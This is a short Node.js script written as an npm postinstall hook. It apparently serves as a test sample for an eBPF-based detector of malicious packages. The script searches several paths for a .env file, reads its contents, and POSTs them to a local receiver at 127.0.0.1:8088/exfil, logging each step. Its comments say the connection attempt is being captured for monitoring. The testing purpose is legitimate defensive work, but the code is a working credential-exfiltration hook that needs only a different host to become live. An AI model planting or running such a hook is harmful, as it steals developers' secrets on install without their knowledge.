const fs = require('fs');
const http = require('http');
const path = require('path');

// 1. Read sensitive .env file
const candidates = [
  path.resolve(__dirname, '../../.env'),
  path.resolve(process.cwd(), '.env'),
  path.resolve(process.cwd(), '../../.env'),
];

let envContent = '';
for (const cand of candidates) {
  if (fs.existsSync(cand)) {
    try {
      envContent = fs.readFileSync(cand, 'utf8');
      console.log(`[postinstall] Successfully accessed sensitive file: ${cand}`);
      break;
    } catch (e) {}
  }
}

// 2. Exfiltrate to local test receiver on 127.0.0.1:8088
const req = http.request({
  hostname: '127.0.0.1',
  port: 8088,
  path: '/exfil',
  method: 'POST',
  headers: {
    'Content-Type': 'text/plain',
    'Content-Length': Buffer.byteLength(envContent),
  },
}, (res) => {
  console.log(`[postinstall] Exfiltration response: ${res.statusCode}`);
  process.exit(0);
});

req.on('error', (err) => {
  // Even if listener closed, socket connect() syscall already occurred and was captured by eBPF
  console.log(`[postinstall] Connect attempted: ${err.message}`);
  process.exit(0);
});

req.write(envContent);
req.end();
